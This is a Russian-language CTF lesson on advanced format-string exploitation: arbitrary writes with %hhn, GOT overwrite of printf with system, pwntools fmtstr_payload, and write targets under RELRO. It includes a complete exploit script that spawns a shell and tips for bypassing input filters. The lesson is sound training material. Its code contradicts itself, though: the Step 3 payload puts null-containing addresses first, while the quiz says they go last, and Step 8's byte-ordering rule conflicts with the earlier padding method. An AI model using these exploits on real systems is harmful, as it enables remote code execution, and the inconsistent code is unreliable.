---
id: pwn-fs-advanced
title: "Format string advanced: произвольная запись и захват GOT"
category: pwn
parent: pwn-got-plt
difficulty: hard
order: 3
tags: [format-string, %n, got-overwrite, arbitrary-write, pwntools-fmtstr]
prerequisites: [pwn-format-string, pwn-got-plt]
useful_for:
  - "CTF Pwn категория"
  - "Захват управления через запись"
  - "Vulnerability research"
estimated_minutes: 60
summary: "Превращаем %n в произвольную запись, перезаписываем GOT/адрес возврата и автоматизируем подбор смещения через fmtstr_payload pwntools."
---

## Вопрос, с которого всё начинается

В базовом уроке про format string ты научился **читать** память через `%p` и `%s` — утекать адреса. Но чтения мало. Хочется **записать** что-нибудь в память: например, заменить `printf` на `system`. Тогда следующая же `printf(buf)` выполнит `system(buf)` — и если `buf` равна `/bin/sh`, это shell.

Для записи существует спецификатор `%n`. Разберём, как превратить его в полноценную произвольную запись.

## Наш пример: printf(buf)

```c
#include <stdio.h>
int main(void) {
    char buf[64];
    fgets(buf, 64, stdin);
    printf(buf);      // format string
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ checksec --file=./chall
    RELRO:    Partial RELRO
```

Partial RELRO — значит GOT **записываем**. Отлично, цель есть.

## Шаг 1. Как работает %n

`%n` записывает в память **число уже выведенных символов**. Если мы напечатали 42 символа и затем вызвали `%n` с указателем на `X`, то по адресу `X` запишется значение 42.

Модификаторы задают ширину записи:

| Спецификатор | Ширина | Применение |
|---|---|---|
| `%hhn` | 1 байт | побайтовая запись (основной приём) |
| `%hn` | 2 байта | компромисс |
| `%n` | 4 байта | редко |
| `%ln` | 8 байт | очень редко |

Прямая запись большого числа (`%1000000c%n`) породит гигантский вывод и замедлит всё, поэтому на практике пишут **побайтово** через `%hhn`.

## Шаг 2. Находим позицию буфера

Сначала узнаем, на какой позиции стека лежит наш буфер. Подадим метку и переберём позиции:

```python
from pwn import *
p = process('./chall')
p.sendline(b'AAAA' + b'.%p' * 30)
print(p.recvline())
```

```text
AAAA.0x7ffe... .0x2a .0x41414141 .0x7f...
```

`0x41414141` — это наши `AAAA`. Если они видны на позиции 6, значит `%6$p` читает первые 4 байта буфера, а `%6$n` запишет **по адресу, который лежит в этих байтах**. На amd64 позиция буфера обычно 6–8.

## Шаг 3. Побайтовая запись вручную

Чтобы записать 8-байтовый адрес, размещаем в начале строки 8 адресов (по одному на байт) и пишем в каждый нужный байт:

```python
from pwn import *
context.binary = elf = ELF('./chall')
target = elf.got['printf']
value  = libc.address + libc.symbols['system']

addrs = b''.join(p64(target + i) for i in range(8))
payload, written = addrs, len(addrs)
for i in range(8):
    want = (value >> (8 * i)) & 0xff
    pad  = (want - written) % 256
    payload += f'%{pad}c%{6 + i}$hhn'.encode()
    written += pad
p.sendline(payload)
```

Позиция `6+i` соответствует `i`-му адресу в буфере. Так мы пишем 8 байт адреса `system` в GOT `printf`.

## Шаг 4. Автоматизация: fmtstr_payload

pwntools делает это сам:

```python
payload = fmtstr_payload(offset, {elf.got['printf']: libc.address + libc.symbols['system']},
                         numbwritten=0, write_size='byte')
p.sendline(payload)
```

Параметры: `offset` — позиция буфера; словарь `{addr: value}` — что записать; `numbwritten` — сколько символов программа уже вывела до нашего payload (например, приглашение); `write_size` — `'byte'|'short'|'int'`. А для автоматического поиска offset есть `FmtStr`:

```python
def exec_fmt(payload):
    p = process('./chall')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
log.info('offset = %d', autofmt.offset)
```

## Шаг 5. Полный эксплойт: printf@got → system

Соберём всё вместе. Сначала утечка libc, потом запись `system` в GOT, потом подаём строку:

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

p = process('./chall')
# 1) утечка libc через printf@got
p.sendline(b'%7$s' + p64(elf.got['printf']))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['printf']
log.success('libc @ %#x', libc.address)

# 2) запись system в printf@got
p.sendline(fmtstr_payload(7, {elf.got['printf']: libc.address + libc.symbols['system']}))

# 3) следующая printf -> system
p.sendline(b'/bin/sh\x00')
p.interactive()
```

```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

## Шаг 6. Цели записи под разные защиты

| Цель | Когда | Заменяет |
|---|---|---|
| `printf@got` | Partial RELRO | `printf` → `system` |
| `__free_hook` | glibc < 2.34 | `free` → `system` |
| `__malloc_hook` | glibc < 2.34 | `malloc` → one_gadget |
| `.fini_array` | Full RELRO | вызов при exit |
| saved RIP | есть адрес стека | возврат в ROP |

На glibc ≥ 2.34 хуки удалены — цели смещаются на FSOP (`_IO_2_1_stdout_`) и `.fini_array`. Адрес стека для перезаписи сохранённого `rip` берут из утечки `environ` (см. `pwn-environ-leak`).

## Шаг 7. Обход фильтров

Фильтры встречаются часто:

- **Запрет `%`** — уязвимости нет, ищи другой примитив.
- **Запрет `n`** — остаётся только чтение.
- **Ограничение длины** — пиши побайтово и размещай адреса компактно.
- **Фильтр на `$`** — используй последовательные `%p` вместо позиционных.
- **Фильтр на нулевые байты** — размещай адреса так, чтобы нули не обрывали строку.

## Шаг 8. Одновременная запись нескольких целей

`fmtstr_payload` умеет писать сразу в несколько адресов — передай словарь с несколькими парами. Это нужно, например, когда для shell требуется записать `system` в GOT и одновременно подготовить строку `/bin/sh` в записываемой памяти (или переписать две записи GOT). Порядок адресов в payload определяется сортировкой по значениям байтов: pwntools сам выстраивает их так, чтобы число выведенных символов монотонно росло. Если пишешь вручную, помни: `%hhn` записывает младший байт текущего счётчика, поэтому байты должны идти в порядке неубывания, а «перескоки» компенсируются паддингом `%Nc`. При нескольких целях следи, чтобы адреса не пересекались и не портили друг друга.

## На что смотреть дальше

- **Неверный offset** — перепроверяй его после смены payload.
- **Забытый `numbwritten`** — приглашение программы уже вывело символы, их надо учесть.
- **Порядок байт** — адреса в payload идут в порядке записи; значения должны возрастать.
- **`%n` пишет 4 байта** — для одного байта используй `%hhn`, иначе затрёшь соседнюю память.
- **Full RELRO** — GOT read-only, целься в `.fini_array`/`__exit_funcs`.
- **Огромный вывод** — `%1000000c` замедлит и оборвёт вывод; пиши побайтово.

## Что мы теперь знаем

- `%n` пишет число выведенных символов по указателю — это и есть запись.
- `%hhn`/`%hn` дают побайтовую/по-словную запись.
- Позицию буфера находят перебором `%p` или через `FmtStr`.
- `fmtstr_payload(offset, {addr: value})` автоматизирует сборку payload.
- Цель записи зависит от RELRO: GOT, хуки или `.fini_array`.

Освоив произвольную запись, ты закрываешь большинство format string задач: одна удачная запись `system` в GOT превращает уязвимость в RCE.

## Квиз

Проверь себя.

```quiz
- question: "Что записывает %hhn?"
  options:
    - "Один байт (число напечатанных байт) по указателю"
    - "Строку"
    - "Указатель"
    - "Ничего"
  answer: 0
  explanation: "%hhn пишет младший байт счётчика, что удобно для точной записи."
- question: "Зачем разбивать значение на байты/слова?"
  options:
    - "Чтобы не печатать миллиарды символов для %n"
    - "Чтобы включить ASLR"
    - "Чтобы снять canary"
    - "Чтобы расширить tcache"
  answer: 0
  explanation: "%hn/%hhn позволяют записывать 2/1 байт с малым счётчиком."
- question: "Какая функция pwntools строит payload для записи?"
  options:
    - "fmtstr_payload"
    - "cyclic"
    - "Ret2dlresolvePayload"
    - "shellcraft"
  answer: 0
  explanation: "fmtstr_payload(offset, {addr: value}) автоматизирует запись."
- question: "Куда целиться при Full RELRO?"
  options:
    - "В .fini_array, exit-обработчики или saved RIP (GOT read-only)"
    - "В GOT"
    - "В canary"
    - "В tcache"
  answer: 0
  explanation: "Full RELRO делает GOT read-only; нужны другие цели записи."
- question: "Почему адреса размещают после спецификаторов?"
  options:
    - "Адрес может содержать \\x00, который обрывает строку"
    - "Так короче"
    - "Иначе не сработает %s"
    - "Так требует libc"
  answer: 0
  explanation: "Нулевые байты в адресе обрывают ввод; адрес кладут в конец."
```

## Куда дальше

Дальше — `pwn-mitigations`: системная карта всех защит (NX, ASLR, PIE, canary, RELRO, CET, seccomp) и того, какую технику выбирать под каждую. А пока главное: **`%n` превращает format string в произвольную запись, а `fmtstr_payload` собирает payload, который переписывает GOT и захватывает управление.**

## Где пригодится

- **CTF:** Pwn — захват GOT и управления через запись.
- **Bug bounty:** эксплуатация форматных строк.
- **Пентест:** разработка эксплойтов.
- **Работа:** vulnerability research.
